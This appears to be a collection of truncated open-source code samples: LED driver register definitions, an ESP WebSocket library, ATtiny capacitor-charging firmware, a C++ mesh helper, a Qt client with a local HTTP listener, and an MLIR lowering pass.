Group_1_Brightness_Register        0x006\n#define Group_2_Brightness_Register        0x007\n#define Group_3_Brightness_Register        0x008\n#define LED_Dot_Brightness_Register_Start  0x200 //Register address from 0x200 to 0x2C5 (8-bit) Or to 0x38B (16-bit)\n\n/* Fault Register Address*/\n#define Fault_State_Register               0x064\n#define LED_Dot_LOD_Register_start         0x065 //Register address from 0x065 to 0x085\n#define LED_Dot_LSD_Register_start         0x086 //Register address from 0x086 to 0x0A6\n\n/* Reset Register Address*/\n#define LOD_Clear_Register                 0x0A7\n#define LSD_Clear_Register                 0x0A8\n#define Reset_Register                     0x0A9\n\n/***************************************************************************//**\n *Register Value\n ******************************************************************************/\n#define Chip_Disable                       0x00\n#define Chip_Enable                        0x01\n\n#define LOD_Clear_En                       0xff\n#define LSD_Clear_En                       0xff\n#define Reset_En                           0xff\n\n/***************************************************************************//**\n *Register Dev_initial Value\n ******************************************************************************/\n#define Max_Line_11                        0xB \n#define Max_Line_10                        0xA\n#define Max_Line_9                         0x9\n#define Max_Line_8                         0x8\n#define Max_Line_7                         0x7\n#define Max_Line_6                         0x6\n#define Max_Line_5                         0x5\n#define Max_Line_4                         0x4\n#define Max_Line_3                         0x3\n#define Max_Line_2                         0x2\n#define Max_Line_1                         0x1\t//default\n\n#define Mode_3_1                           0x3 \n#define Mode_3                             0x2\n#define Mode_2                             0x1\n#define Mode_1                             0x0\t//default\n\n#define PWM_Frequency_62_5k                0x1\n#define PWM_Frequency_125k                 0x0  //default\n\n/***************************************************************************//**\n *Register Dev_config1 Value\n ******************************************************************************/\n#define SW_BLK_05us                        0x1\n#define SW_BLK_1us                         0x0 //default\n\n#define PWM_Scale_Exponential              0x1\n#define PWM_Scale_Linear                   0x0 //default\n\n#define PWM_PhaseShift_on                  0x1\n#define PWM_PhaseShift_off                 0x0 //default\n\n#define CS_Delay_on                        0x1\n#define CS_Delay_off                       0x0 //default\n\n/***************************************************************************//**\n *Register Dev_config2 Value\n ******************************************************************************/\n#define Comp_Group3_3clock                 0x3\n#define Comp_Group3_2clock                 0x2\n#define Comp_Group3_1clock                 0x1\n#define Comp_Group3_Off                    0x0 //default\n\n#define Comp_Group2_3clock                 0x3\n#define Comp_Group2_2clock                 0x2\n#define Comp_Group2_1clock                 0x1\n#define Comp_Group2_Off                    0x0 //default\n\n#define Comp_Group1_3clock                 0x3\n#define Comp_Group1_2clock                 0x2\n#define Comp_Group1_1clock                 0x1\n#define Comp_Group1_Off                    0x0 //default\n\n#define LOD_Removal_En                     0x1\n#define LOD_Removal_Off                    0x0 //default\n\n#define LSD_Removal_En                     0x1\n#define LSD_Removal_Off                    0x0 //default\n\n/***************************************************************************//**\n *Register De",
    "/*\n  Asynchronous WebServer library for Espressif MCUs\n\n  Copyright (c) 2016 Hristo Gochkov. All rights reserved.\n  This file is part of the esp8266 core for Arduino environment.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n#include \"Arduino.h\"\n#include \"AsyncWebSocket.h\"\n\n#include <libb64/cencode.h>\n\n#ifndef ESP8266\n#include \"mbedtls/sha1.h\"\n#else\n#include <Hash.h>\n#endif\n#ifdef ESP32\n#if ESP_IDF_VERSION_MAJOR >= 5\n#include \"rom/ets_sys.h\"\n#endif\n#endif\n\n#define MAX_PRINTF_LEN 64\n\nsize_t webSocketSendFrameWindow(AsyncClient *client){\n  if(!client->canSend())\n    return 0;\n  size_t space = client->space();\n  if(space < 9)\n    return 0;\n  return space - 8;\n}\n\nsize_t webSocketSendFrame(AsyncClient *client, bool final, uint8_t opcode, bool mask, uint8_t *data, size_t len){\n  if(!client->canSend())\n    return 0;\n  size_t space = client->space();\n  if(space < 2)\n    return 0;\n  uint8_t mbuf[4] = {0,0,0,0};\n  uint8_t headLen = 2;\n  if(len && mask){\n    headLen += 4;\n    mbuf[0] = rand() % 0xFF;\n    mbuf[1] = rand() % 0xFF;\n    mbuf[2] = rand() % 0xFF;\n    mbuf[3] = rand() % 0xFF;\n  }\n  if(len > 125)\n    headLen += 2;\n  if(space < headLen)\n    return 0;\n  space -= headLen;\n\n  if(len > space) len = space;\n\n  uint8_t *buf = (uint8_t*)malloc(headLen);\n  if(buf == NULL){\n    //os_printf(\"could not malloc %u bytes for frame header\\n\", headLen);\n    return 0;\n  }\n\n  buf[0] = opcode & 0x0F;\n  if(final)\n    buf[0] |= 0x80;\n  if(len < 126)\n    buf[1] = len & 0x7F;\n  else {\n    buf[1] = 126;\n    buf[2] = (uint8_t)((len >> 8) & 0xFF);\n    buf[3] = (uint8_t)(len & 0xFF);\n  }\n  if(len && mask){\n    buf[1] |= 0x80;\n    memcpy(buf + (headLen - 4), mbuf, 4);\n  }\n  if(client->add((const char *)buf, headLen) != headLen){\n    //os_printf(\"error adding %lu header bytes\\n\", headLen);\n    free(buf);\n    return 0;\n  }\n  free(buf);\n\n  if(len){\n    if(len && mask){\n      size_t i;\n      for(i=0;i<len;i++)\n        data[i] = data[i] ^ mbuf[i%4];\n    }\n    if(client->add((const char *)data, len) != len){\n      //os_printf(\"error adding %lu data bytes\\n\", len);\n      return 0;\n    }\n  }\n  if(!client->send()){\n    //os_printf(\"error sending frame: %lu\\n\", headLen+len);\n    return 0;\n  }\n  return len;\n}\n\n\n/*\n *    AsyncWebSocketMessageBuffer\n */\n\n\n\nAsyncWebSocketMessageBuffer::AsyncWebSocketMessageBuffer()\n  :_data(nullptr)\n  ,_len(0)\n  ,_lock(false)\n  ,_count(0)\n{\n\n}\n\nAsyncWebSocketMessageBuffer::AsyncWebSocketMessageBuffer(uint8_t * data, size_t size) \n  :_data(nullptr)\n  ,_len(size)\n  ,_lock(false)\n  ,_count(0)\n{\n\n  if (!data) {\n    return; \n  }\n\n  _data = new uint8_t[_len + 1];\n\n  if (_data) {\n    memcpy(_data, data, _len);\n    _data[_len] = 0; \n  }\n}\n\n\nAsyncWebSocketMessageBuffer::AsyncWebSocketMessageBuffer(size_t size)\n  :_data(nullptr)\n  ,_len(size)\n  ,_lock(false)\n  ,_count(0)\n{\n  _data = new uint8_t[_len + 1]; \n\n  if (_data) {\n    _data[_len] = 0; \n  }\n  \n}\n\nAsyncWebSocketMessageBuffer::AsyncWebSocketMessageBuffer(const AsyncWebSocketMessageBuffer & copy)\n  :_data(nullptr)\n  ,_len(0)\n  ,_lock(false)\n  ,_count(0)\n{\n  _len = copy._len;\n  _lock = copy._lock;\n  _count = 0;\n\n  if (_len) {\n    _data = new uint8_t[_len + 1]; \n    _data[_len] = 0; \n  } \n\n  if (_data) {\n    memcpy(_data, copy._data, _len);\n    _data[_len] = 0; \n  }\n\n}\n\nAsyncWebSocketMessageBuffer::AsyncWebSocketMessageBuffer(AsyncWebSocketMessageBuffer && copy)\n  :_data(nullptr)\n  ,_len(0)\n  ,_lock(false)\n  ,_count(0)\n{\n  _len = copy._len;\n  _lock = copy._lock;\n  _count = 0;\n\n  if (copy._data) {\n    _data = copy._data; \n    copy._data = nullptr; \n  } \n\n}\n\nAsyncWebSocketMessageBuffer::~AsyncWebSocketMessageBuffer()\n{\n    if (_data) {\n      delete[] _data; \n    }\n}\n\nbool AsyncWebSocketMessageBuffer::reserve(size_t size) \n{\n  _len = size; \n\n  if (_data) {\n    delete[] _data;\n    _data = nullptr; \n  }\n\n  _data = new uint8_t[_len + 1];\n\n  if (_data) {\n    _data[_len] = 0;\n    return true; \n  } else {\n    return false; \n  }\n\n}\n\n\n\n/*\n * Control Frame\n */\n\nclass AsyncWebSocketControl {\n  private:\n    uint8_t _opcode;\n    uint8_t *_data;\n    size_t _len;\n    bool _mask;\n    bool _finished;\n  public:\n    AsyncWebSocketControl(uint8_t opcode, uint8_t *data=NULL, size_t len=0, bool mask=false)\n      :_opcode(opcode)\n      ,_len(len)\n      ,_mask(len && mask)\n      ,_finished(false)\n  {\n      if(data == NULL)\n        _len",
    "#include <avr/wdt.h>                             // Supplied Watch Dog Timer Macros \r\n#include <avr/sleep.h>                           // Supplied AVR Sleep Macros\r\n#include <avr/power.h>                           // Power management\r\n#include <math.h>                                // self explanitory\r\n#include <avr/io.h>                              // AVR pin management\r\n#include <Arduino.h>                             // basic arduino stuff\r\n\r\n#define adc_disable() (ADCSRA &= ~(1<<ADEN))      //to make the code a little more clear when disabling the ADC\r\n#define watchdogRegister WDTCR                    //just to be clear for wdregister\r\n\r\nconst uint8_t powerMosfet = 3;                    //pin to output power mosfets\r\nconst uint8_t statusLED = 2;                      //pin to Status LED\r\n// const uint8_t auxPin0 = 0;                     //AUX pin\r\n// const uint8_t auxPin1 = 1;                     //AUX pin\r\nconst uint8_t capADC = A2;                        //ADC pin testing cap bank voltage\r\nfloat calV = 1.0000;                              //calibration decimal value for 1.1Vref chip specific (lower value = higher voltage detected)\r\nint ADCSettleDelay = 1;                           //Time in ms to wait before performing conversion to allow VRef to settle (minimum is around 50ns, 1ms should be more than enough)\r\nint blinkDelay = 20;                              //blink duration in addition to about 4ms of ADC polling\r\nfloat dividerMultiplier = 1;                      //multiplier for resistor voltage divider\r\nint powerOn = 0;                                  //variable determined when power is on\r\nint voltageTarget = 2500;                         //the target voltage to charge cap bank\r\nint voltageMinimum = 1000;                        //the target voltage to charge cap bank\r\n\r\nvoid setup() {\r\n  wdt_reset();                      //reset watchdog just as precaution\r\n  DDRB |= (1 << powerMosfet);  \t\t\t//replaces pinMode(PB4, OUTPUT); but with open drain\r\n  PORTB |= (1 << powerMosfet);\t\t\t//replaces digitalWrite(PB3, HIGH);\r\n  pinMode(statusLED, OUTPUT);       //output without open drain\r\n  pinMode(capADC, INPUT);\r\n}\r\n\r\nfloat readVcc(void){\r\n  float result = 0;                                     //reset variables\r\n  long raw = 0;\r\n  ADCSRA |= bit(ADPS1) | bit(ADPS0);                    //prescale to 125kHz\r\n  ADCSRA &= ~bit(ADPS2);\r\n  ADMUX &= ~bit(REFS2);                                 //Reference VCC and disable the rest\r\n  ADMUX &= ~bit(REFS0);\r\n  ADMUX &= ~bit(REFS1);\r\n  ADMUX &= ~bit(MUX1);\r\n  ADMUX &= ~bit(MUX0);\r\n  ADMUX |= bit(MUX3) | bit(MUX2);                       //point to Vbg\r\n  ADCSRA |= bit(ADEN);                                  //enable ADC\r\n  delay(ADCSettleDelay);                                // Wait for Vref to settle\r\n  ADCSRA |= bit(ADSC);                                  // Start conversion\r\n  while (bit_is_set(ADCSRA, ADSC));                     // measuring\r\n  raw = ADC;\r\n  result = (1023 * 1.1 * 1000) / raw;                   // Calculate Vcc (in mV)\r\n  result *= calV;                                       //apply chip specific vref calibration value (~1 most of the time)\r\n  ADCSRA &= ~bit(ADEN);                                 //disable ADC\r\n  return result;                                        // Vcc in milivolts\r\n}\r\n\r\nfloat testADCV(uint8_t inputADC, float refV){\r\n  ADCSRA |= bit(ADEN);                                                    //enable ADC\r\n  delay(ADCSettleDelay);                                                  // Wait for ADC to settle\r\n  float readPin = analogRead(inputADC);\r\n  float miliVolt = (readPin * dividerMultiplier / 1023.00f) * refV;       //compare ADC value to VCC reference\r\n  ADCSRA &= ~bit(ADEN);                                                   //disable ADC\r\n  return miliVolt;\r\n}\r\n\r\nvoid goToSleep(void)\r\n{\r\n  set_sleep_mode (SLEEP_MODE_PWR_DOWN);\r\n  noInterrupts ();                                                        // timed sequence coming up\r\n  wdt_reset();                                                            // pat the dog\r\n  MCUSR = 0;                                                              // clear various \"reset\" flags\r\n  watchdogRegister = bit (WDCE) | bit (WDE) | bit (WDIF);                 // allow changes, disable reset, clear existing interrupt\r\n  // set interrupt mode and an interval (WDE must be changed from 1 to 0 here)\r\n  watchdogRegister = 0xD8 | 1 << WDP0 | 1 << WDP3; /* 8.0 seconds */      // set WDIE, and 2 seconds delay\r\n  ADCSRA &= ~bit(ADEN);                                                   //disable ADC\r\n  sleep_enable ();                                                        // ready to sleep\r\n  interrupts ();                                                          // interrupts are required now\r\n  sei();                                                                  // Enable Interrupts \r\n  sleep_cpu ();                                                           // sleep\r\n  sleep_disable ();         ",
    "#include \"pch.h\"\n#include \"GeoMetryHelper.h\"\n#include \"Mesh.h\"\n\nshared_ptr<Mesh> GeoMetryHelper::LoadRectangleBox(const float scale)\n{\n\n    // \ub9ac\uc18c\uc2a4 \ud0a4 \uc0dd\uc131\n    std::wstring key = L\"box\" + std::to_wstring(scale);\n\n    // \uc774\ubbf8 \ub85c\ub4dc\ub41c Mesh\uac00 \uc788\ub2e4\uba74 \ubc18\ud658\n    shared_ptr<Mesh> mesh = ResourceManager::main->Get<Mesh>(key);\n    if (mesh)\n    {\n        return mesh;\n    }\n\n    // Vertex \ubc0f Index \ub370\uc774\ud130 \uc0dd\uc131\n    vector<Vertex_Static> vertices;\n    vertices.reserve(24); // 6\uba74 x 4\uac1c \uc815\uc810\n\n    vector<uint32> indices;\n    indices.reserve(36); // 6\uba74 x 2\uac1c\uc758 \uc0bc\uac01\ud615 x 3\uac1c\uc758 \uc778\ub371\uc2a4\n\n\n    float w2 = scale;\n    float h2 = scale;\n    float d2 = scale;\n\n    vector<Vertex_Static> vec(24);\n\n    // \uc55e\uba74\n    vec[0] = Vertex_Static(vec3(-w2, -h2, -d2), vec2(0.0f, 1.0f), vec3(0.0f, 0.0f, -1.0f));\n    vec[1] = Vertex_Static(vec3(-w2, +h2, -d2), vec2(0.0f, 0.0f), vec3(0.0f, 0.0f, -1.0f));\n    vec[2] = Vertex_Static(vec3(+w2, +h2, -d2), vec2(1.0f, 0.0f), vec3(0.0f, 0.0f, -1.0f));\n    vec[3] = Vertex_Static(vec3(+w2, -h2, -d2), vec2(1.0f, 1.0f), vec3(0.0f, 0.0f, -1.0f));\n    // \ub4b7\uba74\n    vec[4] = Vertex_Static(vec3(-w2, -h2, +d2), vec2(1.0f, 1.0f), vec3(0.0f, 0.0f, 1.0f));\n    vec[5] = Vertex_Static(vec3(+w2, -h2, +d2), vec2(0.0f, 1.0f), vec3(0.0f, 0.0f, 1.0f));\n    vec[6] = Vertex_Static(vec3(+w2, +h2, +d2), vec2(0.0f, 0.0f), vec3(0.0f, 0.0f, 1.0f));\n    vec[7] = Vertex_Static(vec3(-w2, +h2, +d2), vec2(1.0f, 0.0f), vec3(0.0f, 0.0f, 1.0f));\n    // \uc717\uba74\n    vec[8] = Vertex_Static(vec3(-w2, +h2, -d2), vec2(0.0f, 1.0f), vec3(0.0f, 1.0f, 0.0f));\n    vec[9] = Vertex_Static(vec3(-w2, +h2, +d2), vec2(0.0f, 0.0f), vec3(0.0f, 1.0f, 0.0f));\n    vec[10] = Vertex_Static(vec3(+w2, +h2, +d2), vec2(1.0f, 0.0f), vec3(0.0f, 1.0f, 0.0f));\n    vec[11] = Vertex_Static(vec3(+w2, +h2, -d2), vec2(1.0f, 1.0f), vec3(0.0f, 1.0f, 0.0f));\n    // \uc544\ub7ab\uba74\n    vec[12] = Vertex_Static(vec3(-w2, -h2, -d2), vec2(1.0f, 1.0f), vec3(0.0f, -1.0f, 0.0f));\n    vec[13] = Vertex_Static(vec3(+w2, -h2, -d2), vec2(0.0f, 1.0f), vec3(0.0f, -1.0f, 0.0f));\n    vec[14] = Vertex_Static(vec3(+w2, -h2, +d2), vec2(0.0f, 0.0f), vec3(0.0f, -1.0f, 0.0f));\n    vec[15] = Vertex_Static(vec3(-w2, -h2, +d2), vec2(1.0f, 0.0f), vec3(0.0f, -1.0f, 0.0f));\n    // \uc67c\ucabd\uba74\n    vec[16] = Vertex_Static(vec3(-w2, -h2, +d2), vec2(0.0f, 1.0f), vec3(-1.0f, 0.0f, 0.0f));\n    vec[17] = Vertex_Static(vec3(-w2, +h2, +d2), vec2(0.0f, 0.0f), vec3(-1.0f, 0.0f, 0.0f));\n    vec[18] = Vertex_Static(vec3(-w2, +h2, -d2), vec2(1.0f, 0.0f), vec3(-1.0f, 0.0f, 0.0f));\n    vec[19] = Vertex_Static(vec3(-w2, -h2, -d2), vec2(1.0f, 1.0f), vec3(-1.0f, 0.0f, 0.0f));\n    // \uc624\ub978\ucabd\uba74\n    vec[20] = Vertex_Static(vec3(+w2, -h2, -d2), vec2(0.0f, 1.0f), vec3(1.0f, 0.0f, 0.0f));\n    vec[21] = Vertex_Static(vec3(+w2, +h2, -d2), vec2(0.0f, 0.0f), vec3(1.0f, 0.0f, 0.0f));\n    vec[22] = Vertex_Static(vec3(+w2, +h2, +d2), vec2(1.0f, 0.0f), vec3(1.0f, 0.0f, 0.0f));\n    vec[23] = Vertex_Static(vec3(+w2, -h2, +d2), vec2(1.0f, 1.0f), vec3(1.0f, 0.0f, 0.0f));\n\n    vector<uint32> idx(36);\n\n    // \uc55e\uba74\n    idx[0] = 0; idx[1] = 1; idx[2] = 2;\n    idx[3] = 0; idx[4] = 2; idx[5] = 3;\n    // \ub4b7\uba74\n    idx[6] = 4; idx[7] = 5; idx[8] = 6;\n    idx[9] = 4; idx[10] = 6; idx[11] = 7;\n    // \uc717\uba74\n    idx[12] = 8; idx[13] = 9; idx[14] = 10;\n    idx[15] = 8; idx[16] = 10; idx[17] = 11;\n    // \uc544\ub7ab\uba74\n    idx[18] = 12; idx[19] = 13; idx[20] = 14;\n    idx[21] = 12; idx[22] = 14; idx[23] = 15;\n    // \uc67c\ucabd\uba74\n    idx[24] = 16; idx[25] = 17; idx[26] = 18;\n    idx[27] = 16; idx[28] = 18; idx[29] = 19;\n    // \uc624\ub978\ucabd\uba74\n    idx[30] = 20; idx[31] = 21; idx[32] = 22;\n    idx[33] = 20; idx[34] = 22; idx[35] = 23;\n\n\n    // Mesh \ucd08\uae30\ud654 \ubc0f \ub9ac\uc18c\uc2a4 \ub4f1\ub85d\n    mesh = make_shared<Mesh>();\n    mesh->Init(vec, idx);\n    ResourceManager::main->Add(key, mesh);\n\n    return mesh;\n}\n\nshared_ptr<Mesh> GeoMetryHelper::LoadRectangleBoxWithColor(const float scale, vec4 color)\n{\n    // \ub9ac\uc18c\uc2a4 \ud0a4 \uc0dd\uc131\n    //std::wstring key = L\"boxColor\" + std::to_wstring(scale);\n\n    //// \uc774\ubbf8 \ub85c\ub4dc\ub41c Mesh\uac00 \uc788\ub2e4\uba74 \ubc18\ud658\n    shared_ptr<Mesh> mesh;\n    //if (mesh)\n    //{\n    //    return mesh;\n    //}\n\n    // Vertex \ubc0f Index \ub370\uc774\ud130 \uc0dd\uc131\n    vector<Vertex_Color> vertices;\n    vertices.reserve(24); // 6\uba74 x 4\uac1c \uc815\uc810\n\n    vector<uint32> indices;\n    indices.reserve(36); // 6\uba74 x 2\uac1c\uc758 \uc0bc\uac01\ud615 x 3\uac1c\uc758 \uc778\ub371\uc2a4\n\n\n    float w2 = scale;\n    float h2 = scale;\n    float d2 = scale;\n\n    vector<Vertex_Color> vec(24);\n\n    // \uc55e\uba74\n    vec[0] = Vertex_Color(vec3(-w2, -h2, -d2), vec2(0.0f, 1.0f), color);\n    vec[1] = Vertex_Color(vec3(-w2, +h2, -d2), vec2(0.0f, 0.0f), color);\n    vec[2] = Vertex_Color(vec3(+w2, +h2, -d2), vec2(1.0f, 0.0f), color);\n    vec[3] = Vertex_Color(vec3(+w2, -h2, -d2), vec2(1.0f, 1.0f), color);\n    // \ub4b7\uba74\n    vec[4] = Vertex_Color(vec3(-w2, -h2, +d2), vec2(1.0f, 1.0f), color);\n    vec[5] = Vertex_Color(vec3(+w2, -h2, +d2), vec2(0.0f, 1.0f), color);\n    vec[6] = Vertex_Color(vec3(+w2, +h2, +d2), vec2(0.0f, 0.0f), color);\n    vec[7] = Vertex_Color(vec3(-w2, +h2, +d2), vec2(1.0f, 0.0f), color);\n    // \uc717\uba74\n    vec[8] = Vertex_Color(vec3(-w2, +h2, -d2), vec2(0.0f, 1.0f), color);\n    vec[9] = Vertex_Color(vec3(-w2, +h2, +d2), vec2(0.0f",
    "// Created by Eternity_boundary on Jan 4,2025\n#include \"Headers\\backPackMan.h\"\n#include \"Headers\\Celestian.h\"\n#include \"Headers\\Practice.h\"\n#include \"Headers\\JsonRequestHandler.h\"\n#include \"Headers\\LogProcessor.h\"\n#include \"ui_Celestian.h\"\n#include \"Headers\\market.h\"\n#pragma warning(push)\n#pragma warning(disable: _CELESTIAN_DISABLED_WARNING)\n#include <QDebug>\n#include <QJsonArray>\n#include <QJsonDocument>\n#include <QJsonObject>\n#include <QMessageBox>\n#include <QNetworkReply>\n#include <QRegularExpression>\n#include <QTcpServer>\n#include <QTcpSocket>\n#include <QTimer>\n#pragma warning(pop)\n\nqint64 Celestian::userId = -1; // \u521d\u59cb\u5316 userId\nint Celestian::currentGroupId = -1;// \u521d\u59cb\u5316 currentGroupId\nCelestian::Celestian(QWidget* parent)\n\t: QMainWindow(parent)\n\t, ui(new Ui::CelestianClass)\n\t, networkManager(new QNetworkAccessManager(this))\n\t, isRunning(false)\n{\n\tui->setupUi(this);\n\n\tui->progressBar->setVisible(false);\n\n\tconnect(ui->pushButton, &QPushButton::clicked, this, &Celestian::onPushButtonClicked);\n\tconnect(networkManager, &QNetworkAccessManager::finished, this, &Celestian::handleApiResponse);\n\tconnect(ui->tableWidget, &QTableWidget::itemDoubleClicked, this, &Celestian::onTableItemDoubleClicked);\n\tconnect(ui->practice, &QPushButton::clicked, this, &Celestian::onPracticeButtonClicked);\n\tconnect(ui->pack, &QPushButton::clicked, this, &Celestian::onPackButtonClicked);\n\tconnect(ui->act, &QPushButton::clicked, this, &Celestian::onActButtonClicked);\n\tconnect(this, &Celestian::dataReceived, this, &Celestian::onHarvestDataReceived);\n\tconnect(ui->signIn, &QPushButton::clicked, this, &Celestian::onSignButtonClicked);\n\tconnect(ui->bank, &QPushButton::clicked, this, &Celestian::onBankButtonClicked);\n\tconnect(ui->market, &QPushButton::clicked, this, &Celestian::onMarketButtonClicked);\n\tconnect(heartBeatTimer, &QTimer::timeout, this, [this]() {\n\t\tqDebug() << \"heartBeat timed out\";\n\t\tonline_status_flag = false;\n\t\tupdateStatusIndicator(online_status_flag);\n\t\tQMessageBox::warning(nullptr, \"\u8b66\u544a\", \"\u672a\u68c0\u6d4b\u5230\u6709\u6548\u4e0a\u62a5\uff0c\u7a0b\u5e8f\u5c06\u5728\u53d7\u9650\u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u90e8\u5206\u529f\u80fd\u5c06\u88ab\u7981\u7528\");\n\t\t});\n\n\tstartHttpServer();\n\tgetLoginInfo(); // \u7a0b\u5e8f\u542f\u52a8\u65f6\u8bf7\u6c42 login info\n\tQTimer::singleShot(5000, this, [this]() {\n\t\tQ_ASSERT(Celestian::userId != -1);\n\t\tqDebug() << \"User ID is valid, proceeding...\";\n\t\t});\n\theartBeatTimer = new QTimer(this);\n\theartBeatTimer->setInterval(60000);\n\theartBeatTimer->setSingleShot(true);\n}\n\nCelestian::~Celestian()\n{\n\tdelete ui;\n}\n\nqint64 Celestian::getUserId()\n{\n\treturn userId;\n}\n\nint Celestian::getCurrentGroupId()\n{\n\treturn currentGroupId;\n}\n\nvoid Celestian::setCurrentGroupId(int id)\n{\n\tcurrentGroupId = id;\n}\n\nvoid Celestian::onPushButtonClicked()\n{\n\tQUrl apiUrl(\"http://localhost:3000/get_group_list\");\n\tQNetworkRequest request(apiUrl);\n\trequest.setHeader(QNetworkRequest::ContentTypeHeader, \"application/json\");\n\n\tQJsonObject requestBody;\n\trequestBody[\"no_cache\"] = true;\n\n\tnetworkManager->post(request, QJsonDocument(requestBody).toJson());\n}\n\nQString Celestian::processServerReport(const QByteArray& requestData)\n{\n\tint jsonStartIndex = requestData.indexOf(\"\\r\\n\\r\\n\") + 4;\n\tif (jsonStartIndex <= 4 || jsonStartIndex >= requestData.size()) {\n\t\tqWarning() << \"Failed to extract JSON data from request\";\n\t\treturn QString();\n\t}\n\n\tQByteArray jsonData = requestData.mid(jsonStartIndex);\n\tqDebug() << \"Extracted JSON data:\" << jsonData;\n\n\tQJsonParseError parseError;\n\tQJsonDocument jsonDoc = QJsonDocument::fromJson(jsonData, &parseError);\n\tif (parseError.error != QJsonParseError::NoError || !jsonDoc.isObject()) {\n\t\tqWarning() << \"Failed to parse JSON data:\" << parseError.errorString();\n\t\treturn QString();\n\t}\n\n\tQJsonObject jsonObj = jsonDoc.object();\n\tQString postType = jsonObj.value(\"post_type\").toString();\n\n\tif (postType == \"message\") {\n\t\tQString rawMessage = QString::fromUtf8(jsonObj.value(\"raw_message\").toString().toUtf8());\n\t\tqDebug() << \"Parsed message from server:\" << rawMessage;\n\t\treturn rawMessage;  // \u8fd4\u56de\u683c\u5f0f\u5316\u6d88\u606f\n\t}\n\telse if (postType == \"meta_event\") {\n\t\tQString metaEventType = jsonObj.value(\"meta_event_type\").toString();\n\t\tif (metaEventType == \"heartbeat\") {\n\t\t\tqDebug() << \"Heartbeat event received\";\n\t\t\tbool online_status_flag = true;\n\t\t\tupdateStatusIndicator(online_status_flag);\n\t\t\theartBeatTimer->start();\n\t\t}\n\t}\n\telse {\n\t\tqDebug() << \"Received unknown post_type or invalid format\";\n\t}\n\n\treturn QString();\n}\n\nvoid Celestian::startHttpServer()\n{\n\tQTcpServer* server = new QTcpServer(this);\n\n\tconnect(server, &QTcpServer::newConnection, this, [this, server]() {\n\t\tQTcpSocket* client = server->nextPendingConnection();\n\t\tif (client) {\n\t\t\tconnect(client, &QTcpSocket::readyRead, this, [this, client]() {\n\t\t\t\tQByteArray requestData = client->readAll();\n\t\t\t\tqDebug() << \"Received raw request data:\" << requestData;\n\n\t\t\t\tQString formattedMessage = processServerReport(requestData);\n\t\t\t\tif (!formattedMessage.isEmpty()) {\n\t\t\t\t\temit newLogDataReceived(formattedMessage); // \u89e6\u53d1\u4fe1\u53f7\uff0c\u5c06\u6d88\u606f\u53d1\u9001\u7ed9\u65e5\u5fd7\u7a97\u53e3\n\t\t\t\t\temit dataReceived(formattedMessage); // \u89e6\u53d1\u4fe1\u53f7\uff0c\u5c06\u6d88\u606f\u53d1\u9001\u7ed9\u80cc\u5305\u7a97\u53e3\n\t\t\t\t}\n\n\t\t\t\tQByteArray response = \"HTTP/1.1 200 OK\\r\\n\"\n\t\t\t\t\t\"Cont",
    "// Licensed to the Apache Software Foundation (ASF) under one\n// or more contributor license agreements.  See the NOTICE file\n// distributed with this work for additional information\n// regarding copyright ownership.  The ASF licenses this file\n// to you under the Apache License, Version 2.0 (the\n// \"License\"); you may not use this file except in compliance\n// with the License.  You may obtain a copy of the License at\n//\n//   http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing,\n// software distributed under the License is distributed on an\n// \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n// KIND, either express or implied.  See the License for the\n// specific language governing permissions and limitations\n// under the License.\n\n#include \"Hello/HelloDialect.h\"\n#include \"Hello/HelloOps.h\"\n#include \"Hello/HelloPasses.h\"\n\n#include \"mlir/Conversion/AffineToStandard/AffineToStandard.h\"\n#include \"mlir/Conversion/ArithToLLVM/ArithToLLVM.h\"\n#include \"mlir/Conversion/ControlFlowToLLVM/ControlFlowToLLVM.h\"\n#include \"mlir/Conversion/FuncToLLVM/ConvertFuncToLLVM.h\"\n#include \"mlir/Conversion/FuncToLLVM/ConvertFuncToLLVMPass.h\"\n#include \"mlir/Conversion/LLVMCommon/ConversionTarget.h\"\n#include \"mlir/Conversion/LLVMCommon/TypeConverter.h\"\n#include \"mlir/Conversion/MemRefToLLVM/MemRefToLLVM.h\"\n#include \"mlir/Conversion/SCFToControlFlow/SCFToControlFlow.h\"\n#include \"mlir/Dialect/Affine/IR/AffineOps.h\"\n#include \"mlir/Dialect/Arith/IR/Arith.h\"\n#include \"mlir/Dialect/ControlFlow/IR/ControlFlowOps.h\"\n#include \"mlir/Dialect/Func/IR/FuncOps.h\"\n#include \"mlir/Dialect/LLVMIR/LLVMDialect.h\"\n#include \"mlir/Dialect/MemRef/IR/MemRef.h\"\n#include \"mlir/Dialect/SCF/IR/SCF.h\"\n#include \"mlir/Pass/Pass.h\"\n#include \"mlir/Transforms/DialectConversion.h\"\n#include \"llvm/ADT/Sequence.h\"\n\n#include <iostream>\n\nnamespace hello {\nclass PrintOpLowering : public mlir::ConversionPattern {\npublic:\n  explicit PrintOpLowering(mlir::MLIRContext *context)\n      : mlir::ConversionPattern(hello::PrintOp::getOperationName(), 1,\n                                context) {}\n\n  mlir::LogicalResult\n  matchAndRewrite(mlir::Operation *op, mlir::ArrayRef<mlir::Value> operands,\n                  mlir::ConversionPatternRewriter &rewriter) const override {\n    auto *context = rewriter.getContext();                \n    auto memRefType = (*op->operand_type_begin()).cast<mlir::MemRefType>();\n    auto memRefShape = memRefType.getShape();\n    auto loc = op->getLoc();\n\n    mlir::ModuleOp parentModule = op->getParentOfType<mlir::ModuleOp>();\n\n    // Get a symbol reference to the printf function, inserting it if necessary.\n    auto printfRef = getOrInsertPrintf(rewriter, parentModule);\n    mlir::Value formatSpecifierCst = getOrCreateGlobalString(\n        loc, rewriter, \"frmt_spec\", mlir::StringRef(\"%f \\0\", 4), parentModule);\n    mlir::Value newLineCst = getOrCreateGlobalString(\n        loc, rewriter, \"nl\", mlir::StringRef(\"\\n\\0\", 2), parentModule);\n\n    // Create a loop for each of the dimensions within the shape.\n    mlir::SmallVector<mlir::Value, 4> loopIvs;\n    for (unsigned i = 0, e = memRefShape.size(); i != e; ++i) {\n      auto lowerBound = 